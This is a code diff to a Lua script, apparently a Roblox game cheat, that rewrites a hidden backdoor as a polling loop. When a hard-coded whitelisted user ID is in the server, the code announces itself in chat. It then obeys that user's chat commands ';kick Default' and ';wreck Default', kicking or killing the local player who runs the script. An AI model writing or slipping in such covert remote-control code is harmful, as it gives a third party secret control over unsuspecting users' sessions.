@@ -458,24 +458,27 @@ end
 local waypoint = CFrame.new()
 local bruh = lplayer.Name
 local wl = {539847333}
-players.PlayerAdded:Connect(function(player)
-	if table.find(wl,player.UserId)then
-		task.wait(4)
-		game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("....", "All")
-		bruh = player.Name
-		spawn(function()
-			game.Players[bruh].Chatted:Connect(function(message)
-				if table.find(wl,player.UserId) and message == ";kick Default" then
-					game.Players.LocalPlayer:Kick("imagine")
-				end
-				if table.find(wl,player.UserId) and message == ";wreck Default" then
-					game.Players.LocalPlayer.Character.Humanoid.Health = 0
-				end
+while true do
+	task.wait(3)
+	for i,v in pairs(Game.Players:GetChildren()) do
+		if table.find(wl,v.UserId)then
+			task.wait(4)
+			game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("....", "All")
+			bruh = v.Name
+			spawn(function()
+				game.Players[bruh].Chatted:Connect(function(message)
+					if table.find(wl,v.UserId) and message == ";kick Default" then
+						game.Players.LocalPlayer:Kick("imagine")
+					end
+					if table.find(wl,v.UserId) and message == ";wreck Default" then
+						game.Players.LocalPlayer.Character.Humanoid.Health = 0
+					end
 
+				end)
 			end)
-		end)
+		end
 	end
-end)
+end
 
 
 
